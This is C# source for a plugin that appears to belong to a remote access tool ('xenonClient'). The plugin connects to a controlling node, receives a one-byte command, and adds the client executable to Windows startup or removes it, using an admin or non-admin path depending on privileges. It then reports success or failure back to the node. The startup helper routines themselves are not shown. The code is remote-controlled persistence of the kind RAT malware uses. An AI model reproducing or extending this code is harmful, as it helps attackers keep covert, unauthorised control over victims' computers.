using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Resources;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

using xenonClient;


namespace Plugin
{
    public class Main
    {
        enum StartupAction { None, Add, Remove }
        enum StartupResult { Failure, Success }

        public async Task Run(Node node)
        {
            try
            {
                await node.SendAsync(new byte[] { 3 }); // indicate that it has connected
                string executablePath = Assembly.GetEntryAssembly().Location;
                byte[] data = await node.ReceiveAsync();

                if (data == null || data.Length != 1)
                {
                    node.Disconnect();
                    return;
                }

                StartupAction action = (StartupAction)data[0];
                StartupResult result = await HandleStartupAction(executablePath, action);
                await node.SendAsync(new byte[] { (byte)result });

                await Task.Delay(1000); // Simulate some asynchronous operation
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error in Run: {ex.Message}");
                await node.SendAsync(new byte[] { (byte)StartupResult.Failure });
            }
        }

        private async Task<StartupResult> HandleStartupAction(string executablePath, StartupAction action)
        {
            switch (action)
            {
                case StartupAction.Add:
                    bool added = Utils.IsAdmin() ? await Utils.AddToStartupAdmin(executablePath) : await Utils.AddToStartupNonAdmin(executablePath);
                    return added ? StartupResult.Success : StartupResult.Failure;
                case StartupAction.Remove:
                    await Utils.RemoveStartup(executablePath);
                    return StartupResult.Success;
                default:
                    return StartupResult.Failure;
            }
        }
    }
}